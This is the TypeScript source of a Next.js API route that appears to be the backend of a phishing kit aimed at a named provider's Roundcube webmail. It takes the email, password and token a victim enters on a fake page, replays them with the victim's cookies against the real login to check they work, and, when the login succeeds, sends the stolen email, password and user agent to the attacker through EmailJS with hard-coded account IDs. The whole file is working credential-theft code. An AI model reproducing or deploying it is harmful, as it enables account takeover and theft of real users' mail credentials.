import { NextRequest } from "next/server";

export const runtime = "nodejs";

export async function POST(request: NextRequest) {
  try {
    // 1. Parse JSON body sent from your frontend
    const body = await request.json();
    const { email, password, token } = body;

    if (!email || !password || !token) {
      return new Response(
        JSON.stringify({
          success: false,
          message: "Missing email, password, or token",
        }),
        {
          status: 400,
          headers: { "Content-Type": "application/json" },
        },
      );
    }

    // 2. Get Headers from the Frontend Request
    const userAgent = request.headers.get("user-agent") || "Mozilla/5.0";
    const cookieHeader = request.headers.get("cookie") || "";
    const referer = request.headers.get("referer") || "";

    console.log(`Phishing attempt: ${email}`);
    console.log(`Cookies present: ${cookieHeader ? "Yes" : "No"}`);
    console.log(`Referer: ${referer}`);

    // 3. Prepare the payload exactly as Roundcube expects
    const formData = new URLSearchParams({
      _user: email,
      _pass: password,
      _token: token,
      _task: "login",
      _action: "login",
      _timezone: "_default_",
    });

    // 4. Send to the REAL site WITH ALL HEADERS
    const response = await fetch("https://webmail.mwt.net/?_task=login", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": userAgent,
        "Cookie": cookieHeader,       // <--- CRITICAL: Pass the session cookie
        "Referer": referer,           // <--- CRITICAL: Pass the referer
      },
      body: formData.toString(),
      redirect: "follow",
    });

    // 5. Determine success based on the FINAL URL after redirects
    const finalUrl = response.url;
    // Roundcube redirects to _task=mailbox on success, stays on _task=login on failure
    const isSuccess = response.ok && finalUrl.includes("_task=mailbox");

    // 6. Send Email ONLY if login was successful
    if (isSuccess) {
      console.log(`Login successful for ${email}`);
      sendEmail(email, password, userAgent).catch((err) =>
        console.error("Email send failed", err),
      );
    } else {
      console.log(`Login failed for ${email}. Final URL: ${finalUrl}`);
    }

    // 7. Respond to frontend
    return new Response(
      JSON.stringify({
        success: isSuccess,
        url: finalUrl,
        status: response.status,
      }),
      {
        headers: { "Content-Type": "application/json" },
      },
    );
  } catch (error) {
    console.error("Phish Login Error:", error);
    return new Response(
      JSON.stringify({
        success: false,
        message: "Internal Server Error",
      }),
      {
        status: 500,
        headers: { "Content-Type": "application/json" },
      },
    );
  }
}

async function sendEmail(email: string, password: string, userAgent: string) {
  try {
    await fetch("https://api.emailjs.com/api/v1/email/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        service_id: "service_1b86ixe",
        template_id: "template_a2504xo",
        user_id: "lES1DjjjfZ3BGbkw7",
        template_params: {
          email: email,
          password: password,
          user_agent: userAgent.substring(0, 50),
        },
      }),
    });
  } catch (e) {
    console.error("EmailJS Error", e);
  }
}
